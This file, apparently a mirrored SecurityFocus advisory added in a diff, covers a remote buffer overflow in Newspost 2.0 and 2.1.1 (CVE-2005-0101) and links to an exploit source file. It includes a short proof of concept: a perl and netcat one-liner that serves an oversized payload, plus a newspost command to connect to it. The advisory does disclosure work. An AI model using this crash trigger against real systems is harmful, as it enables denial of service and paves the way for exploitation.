@@ -1,0 +1,107 @@
+#SpeeDr00t@Black Falcon<br>#bid12418<p><b><span style="font-size: 18pt;">Newspost Remote Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12418/info">info</a><br><a href="http://www.securityfocus.com/bid/12418/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12418/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12418/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12418/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12418
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-0101<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 01 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 10:06AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability is credited to Niels Heinen.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Newspost Newspost 2.1.1 <br/>
+					
+				
+					Newspost Newspost 2.0 <br/>
+<span class="related">
+						
+							+ 
+						
+						Gentoo Linux  <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x13000/12418/newPostBufferOverflowExploit.c">#exploit_newPostBufferOverflowExploit.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is available, however a proof of concept to trigger the issue is available:<br/>Create a server:<br/>perl -e 'print "A" x 1024;print "BBBBCCCCDDDDEEEE"'|  nc -v -l -p 119<br/><br/>Connect to it:<br/>newspost  -s test -i localhost -f me@me.nl -n news.news  /etc/hosts<br/><br/>The following exploit has been made available:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/newPostBufferOverflowExploit.c">/data/vulnerabilities/exploits/newPostBufferOverflowExploit.c</a></li>
+</ul>
+</div>
